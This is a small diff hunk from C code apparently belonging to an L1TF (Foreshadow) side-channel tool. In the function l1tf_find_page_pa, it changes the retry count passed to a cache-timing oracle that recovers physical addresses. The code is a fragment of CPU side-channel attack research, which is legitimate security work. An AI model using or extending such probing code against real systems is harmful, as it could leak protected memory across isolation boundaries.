@@ -653,7 +653,7 @@ uintptr_t l1tf_find_page_pa(void *p)
       for (off = 0; off < 8; off += 2) {
         char *q = (char *)p + off;
         uintptr_t pa_q = pa + off;
-        int hits = l1tf_oracle16_touch(q, pa_q, 3);
+        int hits = l1tf_oracle16_touch(q, pa_q, 10 + off*1000);
         if (!hits)
           break;
         if (verbose) printf("l1tf_find_page_pa: run %3d  | va %14p  |  pa %12lx  |  hits %4d\n", run, q, pa_q, hits);
